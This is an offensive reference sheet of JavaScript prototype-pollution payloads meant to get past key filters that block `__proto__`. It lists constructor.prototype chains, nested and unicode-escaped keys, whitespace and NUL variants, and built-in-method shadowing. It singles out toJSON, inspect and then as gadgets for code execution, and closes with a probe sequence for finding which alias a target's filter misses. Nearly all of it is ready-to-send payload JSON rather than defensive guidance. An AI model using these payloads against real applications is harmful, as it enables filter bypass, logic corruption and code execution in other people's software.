# The proto-key corpus — every alias that reaches the shared root

`__proto__` is the famous one, not the only one. When the name is
filtered, these are the alternate spellings and accessor shapes that
land on the same setter or on a different shared root.

---

## 1. The three-tier key map

```
TIER 1 — the direct setter
  __proto__              the accessor itself
  ["__proto__"]          bracket form — same setter
  '__proto__'            string form — same
  \x5f\x5fproto\x5f\x5f  hex/unicode escapes (decoded upstream)

TIER 2 — the constructor chain (reaches the same prototype via .prototype)
  constructor            obj.constructor → Function — then .prototype
  constructor.prototype  THE alias when __proto__ is filtered
  ["constructor","prototype"]
  a.constructor.prototype
  proto                  NOT the setter — a literal key, but some
                         hand-rolled merges treat it as shorthand

TIER 3 — other shared roots
  prototype              bare — only lands when the TARGET is a
                         constructor/class object, not a plain obj
  __defineGetter__       deprecated accessor — a write shape
  __defineSetter__       same
  __lookupGetter__       read-side
  __lookupSetter__       read-side
  __count__/__noSuchMethod__/__parent__/__iterator__
                         legacy mozilla-only — dead on V8 but worth
                         one probe on old engines
```

## 2. `constructor.prototype` — the workhorse alias

```js
// why it works:
obj.constructor              // === Object (for a plain {})
obj.constructor.prototype    // === Object.prototype — the root!
merge({}, {constructor:{prototype:{m:1}}})
//   merge walks: dest.constructor → Function 'Object'
//   then dest.constructor.prototype → Object.prototype
//   then writes m=1 ON it — pollution, no '__proto__' string
```

The merge doesn't see a reserved key — it sees `constructor` (a
normal read on any object) then `prototype`. Each step is a legal
property access; the composition is pollution.

## 3. When `constructor` is also filtered

```js
// nested variants — the filter checks the TOP key only
{"a": {"constructor": {"prototype": {"m": 1}}}}
{"a": {"b": {"constructor": {"prototype": {"m": 1}}}}}

// __proto__ under constructor — double-dip
{"constructor": {"prototype": {"__proto__": {"m": 1}}}}
{"__proto__": {"constructor": {"prototype": {"m": 1}}}}

// proto chain through array
{"0": {"__proto__": {"m": 1}}}
{"arr": [{"__proto__": {"m": 1}}]}
```

## 4. The `proto` shorthand — application-defined

Some apps hand-roll `proto` as a merge alias:

```js
// app-side
const p = src.proto || src.__proto__ || src.constructor?.prototype;
merge(dest, p)
// {"proto": {"m": 1}} — the key isn't reserved; the APP resolves it
```

Worth one probe when `__proto__`/`constructor` both reject — a
`proto` key the app's own code maps to the prototype.

## 5. Encoding-level keys

```json
{"__prot\u006f__": {"m": 1}}
{"\u005f\u005fproto\u005f\u005f": {"m": 1}}
{"__proto__ ": {"m": 1}}
{" __proto__": {"m": 1}}
{"__proto__\t": {"m": 1}}
{"__proto__\n": {"m": 1}}
{"__proto__\u0000": {"m": 1}}
{"\u0000__proto__": {"m": 1}}
{"__PROTO__": {"m": 1}}
{"__Proto__": {"m": 1}}
{"__proto____": {"m": 1}}
{"___proto___": {"m": 1}}
{"__proto__": [{"m": 1}]}
```

- `\u006f` escapes: JSON allows `\uXXXX` in keys — a filter matching
  the literal string `__proto__` misses the escaped spelling; the
  JSON parser decodes it BEFORE the merge sees it.
- Whitespace/NUL suffixes: a `.trim()`-missing filter lets them
  through; whether they still hit the `__proto__` setter depends on
  the merge (`dest[" __proto__"]` is NOT the setter — a literal key).
  Low-yield but one probe each.
- Case variants: `__PROTO__` is NOT the accessor — literal key —
  dead unless the app lowercases keys first.

## 6. The `prototype` bare key — the class-target case

```json
{"prototype": {"m": 1}}
```

Only works when the merge TARGET is a function/class — `dest` being
a constructor object where `dest.prototype` is shared state. Rare —
but when the merged object IS `SomeClass`, `prototype` writes land
on the class proto. Check: does the app merge into a function?

## 7. `__defineGetter__`/`__defineSetter__` — legacy accessors

```json
{"__defineGetter__": {"x": "f"}}
{"__defineSetter__": {"x": "f"}}
```

These are Object.prototype METHODS, not pollution keys — writing
them into the proto shadows the method names for every object. Low
payoff; the interest is they can break `for..in` enumeration guards
that rely on the accessor methods.

## 8. The `toString`/`valueOf`/`constructor` shadow set

```json
{"__proto__": {"toString": "x"}}
{"__proto__": {"valueOf": "x"}}
{"__proto__": {"constructor": "x"}}
{"__proto__": {"hasOwnProperty": "x"}}
{"__proto__": {"isPrototypeOf": "x"}}
{"__proto__": {"propertyIsEnumerable": "x"}}
{"__proto__": {"toLocaleString": "x"}}
{"__proto__": {"__proto__": "x"}}
{"__proto__": {"__defineGetter__": "x"}}
{"__proto__": {"__defineSetter__": "x"}}
{"__proto__": {"__lookupGetter__": "x"}}
{"__proto__": {"__lookupSetter__": "x"}}
{"__proto__": {"toJSON": "x"}}
{"__proto__": {"inspect": "x"}}
{"__proto__": {"then": "x"}}
{"__proto__": {"constructor": {"prototype": {"m": 1}}}}
```

Shadowing built-in methods is usually a crash, not a payoff — but
`toJSON`/`inspect`/`then`/`constructor` have gadget value:

- `toJSON` — a polluted function runs on `JSON.stringify` of EVERY
  object — a code-exec primitive at stringification.
- `inspect` — node `util.inspect` calls `obj.inspect` when present —
  a custom-inspect gadget.
- `then` — makes every object thenable — `await obj` calls your
  `then` — a promise-resolution primitive.
- `constructor` — `obj.constructor` reads lie everywhere — confused-
  identity and sometimes a `constructor.prototype` re-entry.

## 9. Array/prototype-adjacent keys

```json
{"__proto__": {"length": 0}}
{"__proto__": {"0": "x"}}
{"__proto__": {"push": "x"}}
{"__proto__": {"map": "x"}}
{"__proto__": {"slice": "x"}}
{"__proto__": {"indexOf": "x"}}
{"__proto__": {"includes": "x"}}
{"__proto__": {"forEach": "x"}}
{"__proto__": {"join": "x"}}
{"__proto__": {"concat": "x"}}
{"__proto__": {"flat": "x"}}
{"__proto__": {"find": "x"}}
{"__proto__": {"filter": "x"}}
{"__proto__": {"reduce": "x"}}
{"__proto__": {"at": "x"}}
{"__proto__": {"Symbol(Symbol.iterator)": "x"}}
```

`__proto__.length`/`[0]` on Object.prototype doesn't reach arrays
(arrays inherit from Array.prototype first). To hit ARRAY methods
you'd need `Array.prototype` — reachable via `arr.__proto__` — a
rarer path: `{"a":[],"b":{"__proto__":{...}}}` doesn't do it; the
merge would have to write INTO an array's `__proto__` — the
`arr.constructor.prototype` path where `arr.constructor===Array`.

## 10. The "which alias does the filter miss" probe set

```bash
# one request each — the readback tells which alias lands
1. __proto__                    # baseline
2. constructor.prototype        # the standard alias
3. a.constructor.prototype      # nested alias
4. \u005f\u005fproto\u005f\u005f  # escaped
5. proto                        # app-defined shorthand
6. prototype                    # bare (function targets)
7. __defineGetter__             # legacy
8. constructor                  # (incomplete path — own-write to
                                #  dest.constructor? no — it's a READ
                                #  chain step; as a VALUE it writes
                                #  the constructor key itself)
```

Each is a falsifiable arm — a `refutes` on all of them closes the
key-filter dimension.
